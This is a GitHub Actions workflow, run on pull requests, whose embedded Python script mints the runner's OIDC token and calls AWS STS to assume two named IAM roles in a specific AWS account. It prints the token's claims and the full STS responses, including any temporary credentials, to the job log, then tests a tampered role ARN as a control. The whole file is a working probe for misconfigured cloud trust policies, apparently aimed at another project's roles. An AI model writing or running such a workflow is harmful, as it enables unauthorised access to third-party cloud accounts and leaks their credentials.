name: c211-i123442 mint
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  mint:
    runs-on: ubuntu-latest
    steps:
      - name: mint
        env:
          TARGETS: "arn:aws:iam::952853449216:role/opendal-testing,arn:aws:iam::952853449216:role/opendal-testing-assume"
        run: |
          python3 - <<'PY'
          import os,json,hashlib,base64,urllib.request,urllib.parse,urllib.error
          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
          def mktok(aud):
              sep='&' if '?' in url else '?'
              r=urllib.request.Request(url+sep+'audience='+aud,headers={'Authorization':'Bearer '+tok,'User-Agent':'c211-i123442'})
              return json.loads(urllib.request.urlopen(r,timeout=30).read())['value']
          def claims(j):
              try:
                  p=j.split('.')[1]; p+='='*(-len(p)%4)
                  d=json.loads(base64.urlsafe_b64decode(p))
                  return {'sub':d.get('sub'),'aud':d.get('aud'),'ref':d.get('ref'),'event':d.get('event'),'repository':d.get('repository'),'ref_type':d.get('ref_type')}
              except Exception as e: return {'err':repr(e)[:120]}
          def sts(arn,jwt):
              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,
                  'RoleSessionName':'c211-123442','DurationSeconds':'900','WebIdentityToken':jwt}).encode()
              req=urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'c211'})
              try:
                  r=urllib.request.urlopen(req,timeout=30); return r.status,r.read(6000).decode('utf-8','replace')
              except urllib.error.HTTPError as e: return e.code,e.read(6000).decode('utf-8','replace')
              except Exception as e: return None,repr(e)[:300]
          jwt=mktok('sts.amazonaws.com')
          print('C211R_TOKEN len=%d sha256_12=%s'%(len(jwt),hashlib.sha256(jwt.encode()).hexdigest()[:12]))
          print('C211R_CLAIMS '+json.dumps(claims(jwt)))
          first=list(os.environ['TARGETS'].split(','))[0]
          for arn in os.environ['TARGETS'].split(','):
              code,b=sts(arn,jwt)
              print('C211R_RESULT '+json.dumps({'arn':arn,'http':code,'body':b[:2500]}))
          tam=first[:-1]+('f' if first[-1]!='f' else 'e')
          code,b=sts(tam,jwt)
          print('C211R_RESULT '+json.dumps({'arn':tam,'control':True,'http':code,'body':b[:1500]}))
          print('C211R_DONE')
          PY
